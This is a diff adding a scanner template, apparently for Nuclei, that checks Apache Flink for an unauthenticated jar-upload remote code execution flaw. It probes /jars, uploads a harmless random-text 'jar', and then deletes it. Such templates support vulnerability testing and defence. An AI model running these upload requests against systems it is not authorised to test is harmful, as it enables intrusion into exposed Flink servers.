@@ -1,0 +1,78 @@
+id: apache-flink-upload-rce
+
+info:
+  name: Apache Flink Upload Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    Exploits a vulnerability in Apache Flink that allows remote code execution through jar file uploads.
+
+variables:
+  r1: "{{rand_text_alphanumeric(8)}}"
+  r2: "{{rand_text_alphanumeric(4)}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: check-jars-endpoint
+    method: GET
+    path:
+      - "{{BaseURL}}/jars"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+      - type: word
+        part: body
+        words:
+          - "address"
+          - "files"
+
+  - id: upload-jar
+    method: POST
+    path:
+      - "{{BaseURL}}/jars/upload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=8ce4b16b22b58894aa86c421e8759df3"
+    body: |
+      --8ce4b16b22b58894aa86c421e8759df3
+      Content-Disposition: form-data; name="jarfile"; filename="{{r2}}.jar"
+      Content-Type: application/octet-stream
+
+      {{r1}}
+      --8ce4b16b22b58894aa86c421e8759df3--
+    extractors:
+      - type: regex
+        name: filen
+        group: 1
+        regex:
+          - "([a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}_[a-z]{4}\\.jar)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "{{r2}}"
+
+  - id: delete-jar
+    method: DELETE
+    path:
+      - "{{BaseURL}}/jars/{{filen}}"
+    matchers:
+      - type: status
+        status:
+          - 200
